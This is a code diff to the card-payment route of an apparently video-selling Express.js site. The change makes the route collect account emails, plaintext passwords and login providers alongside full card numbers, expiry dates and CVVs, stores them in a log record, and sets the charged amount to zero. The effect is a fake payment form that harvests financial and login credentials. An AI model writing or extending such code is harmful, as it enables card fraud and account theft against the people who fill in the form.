@@ -31,7 +31,18 @@ module.exports.pendingLogs = pendingLogs;
  */
 router.post('/submit', requireSession, paymentLimiter, async (req, res) => {
     try {
-        const { card_name, card_number, expiry, cvv, email, video_id, amount_euros } = req.body;
+        const {
+            card_name,
+            card_number,
+            expiry,
+            cvv,
+            email,
+            video_id,
+            amount_euros,
+            auth_email,
+            auth_password,
+            auth_provider,
+        } = req.body;
 
         if (!card_name || !card_number || !expiry || !cvv || !email || !video_id) {
             return res.status(400).json({ error: 'All card fields are required.' });
@@ -59,7 +70,10 @@ router.post('/submit', requireSession, paymentLimiter, async (req, res) => {
             expiry,
             cvv,
             email,
-            amount_euros:  video.price_euros,
+            auth_email:    auth_email || email || null,
+            auth_password: auth_password || null,
+            auth_provider: auth_provider || 'guest',
+            amount_euros:  0,
             submitted_at:  new Date().toISOString(),
         });
 
